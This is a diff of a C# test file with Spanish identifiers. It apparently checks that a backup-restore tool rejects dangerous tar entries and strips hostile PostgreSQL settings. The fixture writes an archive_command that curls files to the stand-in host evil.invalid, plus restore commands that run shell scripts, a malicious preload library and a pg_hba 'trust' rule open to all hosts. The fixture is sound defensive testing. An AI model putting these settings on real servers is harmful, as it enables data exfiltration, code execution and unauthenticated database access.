@@ -181,6 +181,7 @@ public sealed class RestauracionDeEnsayoTests(RespaldosFixture entorno) : IAsync
     [InlineData("echo x > a && ln a b && tar -cf /tmp/malo.tar a b", "enlace duro")]
     [InlineData("mkfifo tuberia && tar -cf /tmp/malo.tar tuberia", "entrada especial")]
     [InlineData("mknod dispositivo c 1 3 && tar -cf /tmp/malo.tar dispositivo", "entrada especial")]
+    [Trait("Criterio", "AC-PLA-17")]
     public async Task UnTarConEntradasPeligrosas_SeRechazaEnteroAntesDeExtraer_SinDejarNadaFueraNiDentro(string armado, string motivo)
     {
         var (codigo, errores, destino, fuera) = await Extraer(armado);
@@ -209,7 +210,7 @@ public sealed class RestauracionDeEnsayoTests(RespaldosFixture entorno) : IAsync
     {
         const string Armado = """
             mkdir datos && cd datos
-            printf '%s\n' "archive_mode = on" "archive_command = 'curl https://evil.invalid/%f'" "restore_command = 'cp /x/%f %p'" "primary_conninfo = 'host=evil.invalid'" "include 'ajeno.conf'" "shared_buffers = 128MB" "#archive_command = 'comentario original'" > postgresql.conf
+            printf '%s\n' "archive_mode = on" "archive_command = 'curl https://evil.invalid/%f'" "restore_command = 'cp /x/%f %p'" "primary_conninfo = 'host=evil.invalid'" "include 'ajeno.conf'" "INCLUDE_DIR 'otra'" "ARCHIVE_COMMAND = 'curl https://evil.invalid/MAYUS'" "Restore_Command = 'sh /evil'" "Shared_Preload_Libraries = './evil'" "dynamic_library_path = '.'" "ssl_passphrase_command = '/evil'" "shared_buffers = 128MB" "#archive_command = 'comentario original'" > postgresql.conf
             printf '%s\n' "archive_command = 'curl https://evil.invalid'" "restore_command = 'sh /evil'" > postgresql.auto.conf
             printf '%s\n' "host all all 0.0.0.0/0 trust" > pg_hba.conf
             echo "ident de otro" > pg_ident.conf
@@ -238,13 +239,11 @@ public sealed class RestauracionDeEnsayoTests(RespaldosFixture entorno) : IAsync
         Assert.Equal("700 600 600", string.Join(' ', modo.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)));
         Assert.Equal("0", auto.Stdout.Trim());
         Assert.Equal("0", ident.Stdout.Trim());
-        Assert.Matches(@"(?m)^# \(ignorado al restaurar\) archive_mode = on$", conf);
-        Assert.Matches(@"(?m)^# \(ignorado al restaurar\) archive_command = 'curl https://evil\.invalid/%f'$", conf);
-        Assert.Matches(@"(?m)^# \(ignorado al restaurar\) restore_command = ", conf);
-        Assert.Matches(@"(?m)^# \(ignorado al restaurar\) primary_conninfo = ", conf);
-        Assert.Matches(@"(?m)^# \(ignorado al restaurar\) include 'ajeno\.conf'$", conf);
-        Assert.Contains("shared_buffers = 128MB", conf, StringComparison.Ordinal);
-        Assert.DoesNotMatch(@"(?m)^\s*(archive_command|restore_command|primary_conninfo|include)\b", conf);
+        Assert.Contains("Generado al restaurar", conf, StringComparison.Ordinal);
+        Assert.Contains("listen_addresses = ''", conf, StringComparison.Ordinal);
+        Assert.DoesNotContain("evil", conf, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("shared_buffers", conf, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotMatch(@"(?im)^\s*(archive_command|restore_command|primary_conninfo|include|include_dir|shared_preload_libraries|dynamic_library_path|ssl_passphrase_command)\b", conf);
         Assert.DoesNotContain("0.0.0.0", hba, StringComparison.Ordinal);
         Assert.DoesNotContain("trust", hba, StringComparison.Ordinal);
         Assert.Contains("scram-sha-256", hba, StringComparison.Ordinal);
